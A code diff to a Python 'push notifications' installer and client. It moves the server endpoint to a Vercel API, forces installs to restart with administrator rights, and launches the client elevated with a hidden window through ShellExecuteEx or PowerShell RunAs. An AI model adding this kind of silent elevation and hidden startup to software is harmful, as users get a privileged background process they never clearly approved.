@@ -71,7 +71,7 @@ SCRIPT_URL = "https://push-notifications-phi.vercel.app"
 
 # Global configuration for client
 CLIENT_CONFIG = {
-    'server_url': 'https://script.google.com/macros/s/AKfycbxz_tUH78XlNqLpdQKqy9SrD6dK6Y0azFIXCM0kUpo3kEfAD6jWoMsngxO710KxTrA/exec',
+    'server_url': f"{SCRIPT_URL}/api/index",  # Use Vercel API for all server communications
     'client_version': '1.1.9',
     'check_interval': 30,  # seconds
     'encryption_algorithm': 'AES-256',
@@ -1820,6 +1820,12 @@ To uninstall:
         
     def run_fresh_install(self):
         """Run fresh installation process"""
+        # Check if we need admin privileges for installation
+        if not check_admin_privileges():
+            print("Installation requires administrator privileges. Restarting...")
+            restart_with_admin()
+            return True  # Return true as we're restarting with admin
+        
         # Validate installation key before proceeding
         if not self.validate_installation_key():
             return False
@@ -1861,11 +1867,11 @@ To uninstall:
         print(f"or simply: {install_dir}/uninstall{'.bat' if self.system == 'Windows' else '.sh'}")
         print(f"The client will check for updates automatically at startup.")
         
-        # Automatically start the client without asking
-        print("\nStarting client automatically...")
+        # Automatically start the client with admin privileges
+        print("\nStarting client with administrator privileges...")
         try:
-            subprocess.Popen([sys.executable, str(install_dir / "installer.py")])
-            print("Client started successfully!")
+            self._start_client_with_admin(install_dir)
+            print("Client started successfully with administrator privileges!")
         except Exception as e:
             print(f"Could not start client: {e}")
             
@@ -2369,6 +2375,66 @@ if __name__ == "__main__":
             print(f"✗ Client registration error: {e}")
         
         return False
+    
+    def _start_client_with_admin(self, install_dir):
+        """Start the client with administrator privileges and ensure it's visible in taskbar"""
+        try:
+            client_script = install_dir / "installer.py"
+            
+            # Use runas to start with admin privileges but keep it visible in taskbar
+            if WIN32_AVAILABLE:
+                try:
+                    from win32com.shell import shell
+                    
+                    # Start the client with admin privileges using ShellExecuteEx
+                    # Use python.exe (not pythonw.exe) so the process is visible in task manager
+                    shell.ShellExecuteEx(
+                        lpVerb='runas',  # Run as administrator
+                        lpFile=sys.executable,  # python.exe
+                        lpParameters=f'"{str(client_script)}"',
+                        lpDirectory=str(install_dir),
+                        nShow=0  # Hide the console window but keep process visible
+                    )
+                    
+                    print("Client started with administrator privileges using ShellExecuteEx")
+                    return True
+                    
+                except Exception as e:
+                    print(f"ShellExecuteEx method failed: {e}")
+            
+            # Fallback method using subprocess with runas
+            try:
+                # Use powershell Start-Process with -Verb RunAs
+                powershell_cmd = f'''Start-Process -FilePath "python.exe" -ArgumentList '"{str(client_script)}"' -Verb RunAs -WorkingDirectory "{str(install_dir)}" -WindowStyle Hidden'''
+                
+                result = subprocess.run([
+                    'powershell.exe', '-Command', powershell_cmd
+                ], capture_output=True, text=True, timeout=30)
+                
+                if result.returncode == 0:
+                    print("Client started with administrator privileges using PowerShell")
+                    return True
+                else:
+                    print(f"PowerShell method failed: {result.stderr}")
+                    
+            except Exception as e:
+                print(f"PowerShell method failed: {e}")
+            
+            # Last resort: regular subprocess (will require user to accept UAC prompt)
+            try:
+                subprocess.Popen([
+                    sys.executable, str(client_script)
+                ], cwd=str(install_dir))
+                print("Client started with regular privileges (UAC prompt may appear)")
+                return True
+                
+            except Exception as e:
+                print(f"Regular start method failed: {e}")
+                return False
+                
+        except Exception as e:
+            print(f"Failed to start client with admin privileges: {e}")
+            return False
 
 class PushNotificationsClient:
     """Main client application class"""
